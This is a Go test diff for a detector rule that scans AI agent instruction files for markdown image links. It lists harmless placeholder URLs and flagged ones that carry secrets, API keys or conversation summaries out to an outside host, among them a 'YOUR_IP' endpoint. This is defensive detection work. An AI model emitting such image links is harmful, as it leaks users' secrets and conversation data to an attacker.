@@ -115,3 +115,31 @@ func TestCFG033_Issue888(t *testing.T) {
 		}
 	}
 }
+
+// <you>, <pr> and <host> name a repository location or a host, not
+// conversation data (#1190). <topic> stays a free-text slot.
+func TestCFG033_Issue1190(t *testing.T) {
+	for _, s := range []string{
+		"![chart](https://raw.githubusercontent.com/<you>/<repo>/assets/<pr>/coverage.png)",
+		"![step](https://raw.githubusercontent.com/my-org/my-tool/<branch>-screens/<pr>/01_step.png)",
+		"![badge](https://example.com/badge/<host>.svg)",
+		"![u](https://example.com/avatars/<username>.png)",
+		"![n](https://example.com/pulls/<pr-number>.png)",
+	} {
+		if f := CFG033.Check(claudeMDTarget(s)); len(f) != 0 {
+			t.Errorf("expected no finding for %q, got %+v", s, f)
+		}
+	}
+	for _, s := range []string{
+		"![x](http://YOUR_IP:8000/p?d=<secret>)",
+		"![x](https://example.com/p/<conversation_summary>.png)",
+		"![x](https://example.com/img.png?d=<api_key>)",
+		"![x](https://example.com/q?pr=<pr>)",
+		"![x](https://example.com/p/<expr>.png)",
+		"![shot](https://raw.githubusercontent.com/my-org/my-tool/screens/<pr-number>-<topic>/<file>.png)",
+	} {
+		if f := CFG033.Check(claudeMDTarget(s)); len(f) != 1 {
+			t.Errorf("expected one finding for %q, got %+v", s, f)
+		}
+	}
+}
